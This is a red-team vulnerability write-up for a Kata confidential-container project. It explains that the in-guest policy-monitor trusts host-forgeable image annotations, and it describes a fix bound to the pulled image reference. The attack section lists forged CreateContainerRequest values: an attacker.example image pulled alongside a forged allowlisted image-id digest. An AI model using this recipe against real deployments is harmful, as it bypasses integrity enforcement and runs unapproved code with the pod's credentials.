# RT-003 — In-guest policy-monitor enforces the allowlist on host-forgeable annotations, not on the pulled image

**Status:** confirmed by code audit (repro test in this branch)
**Severity:** Critical — total bypass of the in-guest image-integrity enforcer by exactly the adversary it exists to stop
**Adversary:** the host (containerd / kata-shim / direct kata-agent ttRPC over vsock — explicitly in scope: `docs/kata-image-policy.md` trust-boundary table, "Can call kata-agent RPCs via vsock")

## Summary

In pod-as-CVM mode, `policy-monitor` is documented as "the load-bearing
enforcer on a locked confidential guest — the host cannot tamper with it"
(README, Features; `docs/THREAT_MODEL.md` §4). The host indeed cannot tamper
with the monitor — but it doesn't need to: **every byte of the monitor's
decision input is host-authored text**, and nothing ever cross-checks it
against the image the guest actually pulled and runs.

The chain, end to end:

1. The host sends kata-agent a `CreateContainerRequest`. The OCI spec —
   including all annotations — is host-authored, and kata-agent writes it
   verbatim to `/run/kata-containers/<cid>/config.json`
   (`kata-containers/src/agent/src/rpc.rs` `do_create_container` →
   `setup_bundle`).
2. The guest pulls its image from `storage.source()` in the same request —
   a **second, independent** host-chosen value
   (`kata-containers/src/agent/src/storage/image_pull_handler.rs:52`,
   `let image_name = storage.source();` — with the upstream comment
   "Currently the image metadata is not used to pulling image in the
   guest"). The resolved digest is discarded (`ImagePullResponse` is empty,
   `confidential_data_hub.proto:42`).
3. `policy-monitor` reads `config.json` and calls `extractDigest`
   (`internal/cmds/policymonitor/allowlist.go:183-201`), which takes the
   first digest-shaped value from `io.kubernetes.cri.image-name`,
   **`io.kubernetes.cri.image-id`**, or
   `org.opencontainers.image.ref.name` — all host text — and allows the
   container when it matches the allowlist
   (`internal/cmds/policymonitor/monitor.go:360-380`).

## Attack

The host (or a patched shim, or anything with vsock access to kata-agent)
issues `CreateContainerRequest` with:

- `storage.source = "attacker.example/malware:latest"` — the guest
  guest-pulls and unpacks the attacker's image;
- OCI annotations `io.kubernetes.cri.image-name =
  "attacker.example/malware:latest"` (no digest → skipped by
  `extractDigest`) and `io.kubernetes.cri.image-id =
  "sha256:<any allowlisted digest>"`.

`extractDigest` normalizes the forged `image-id`, the monitor logs "allow
container", and the malware runs **inside the attested CVM** with the pod's
full identity: the mesh certificates in `/etc/c8s/certs`, the pod network
namespace, and any workload data/secrets the pod can reach. A variant sets
`image-name` to a digest-pinned allowlisted reference while `storage.source`
pulls something else — the two fields are never compared, so no annotation
choice can make the check sound.

What this breaks, in the product's own terms: "Container image
allowlisting — Every image is enforced against a CDS-served digest
allowlist: … an in-guest `policy-monitor` under Kata, where the host cannot
tamper with it." The enforcer is untampered; its input is forged. RT-001
(fake CDS) composes with this: an attacker CA plus an un-allowlisted image
yields a fully "confidential" workload the operator never approved, with
mesh credentials issued by the attacker's trust root.

## Why existing mitigations don't cover it

- The host-side NRI plugin is explicitly untrusted in pod-as-CVM mode — the
  in-guest monitor is the backstop, and this is the backstop failing.
- `THREAT_MODEL.md` §5 discusses two historical policy-monitor misses
  (watch-dir replacement, cgroup naming) — both about the *kill path*. This
  is a third, earlier failure: the *decision input* is untrustworthy. It is
  not listed in `docs/kata-image-policy.md` Known gaps (G1–G4).
- `extractDigest`'s `image-id` fallback exists because honest CRI flows
  stamp it; the monitor has no way to know whether it was stamped by an
  honest containerd or forged by the host — under the stated adversary it
  must assume forged.

## Fix (this branch + companion kata-containers branch)

The decision input must be bound to the pull. `storage.source` is the only
value that determines what the guest pulls, and a `@sha256:`-pinned pull
reference cryptographically binds the pulled content — so:

- **kata-containers (`redteam/stamp-pulled-image-ref`)**:
  `ImagePullHandler::create_device` records the true pull reference into the
  bundle at `/run/kata-containers/<cid>/c8s-pulled-image` immediately after
  the pull succeeds. (A stronger future variant has CDH/image-rs return the
  *resolved* digest — `ImagePullResponse` is empty today.)
- **c8s (this branch)**: `policy-monitor` prefers the stamped pull
  reference: when the stamp exists it must carry `@sha256:<digest>` and the
  digest must be allowlisted — a tag-only pull reference is denied (fail
  closed; digest pinning is the only sound binding). When the stamp is
  absent the legacy annotation path still runs for compatibility, but the
  new `--require-pulled-image-stamp` flag turns absence into a denial; the
  guest systemd unit should set it once the kata-agent stamp ships.
- Rollout note: the legacy annotation path remains forgeable and is kept
  only for transition; after the kata-agent stamp is ubiquitous, fail-closed
  is the intended steady state.

Residual (separate, already partially documented): `CopyFileRequest` is
allowed by the guest OPA policy and is not path-scoped, so the host can
tamper with the unpacked rootfs *after* a legitimate pull — the stamp binds
what was pulled, not what later runs. Closing that needs either
path-scoping CopyFile or re-verifying content at exec (the BPF-LSM path in
`docs/kata-image-policy.md` G4).

## Reproduce

`internal/cmds/policymonitor/rt003_repro_test.go` — a host-forged bundle
(`image-name` tag + forged allowlisted `image-id`) is **allowed** by the
current decision path (documents the vulnerability), and the same bundle
with a stamped pull reference to a non-allowlisted image is **denied**
under the new path (proves the fix):

```
go test ./internal/cmds/policymonitor/ -run RT003 -v
```
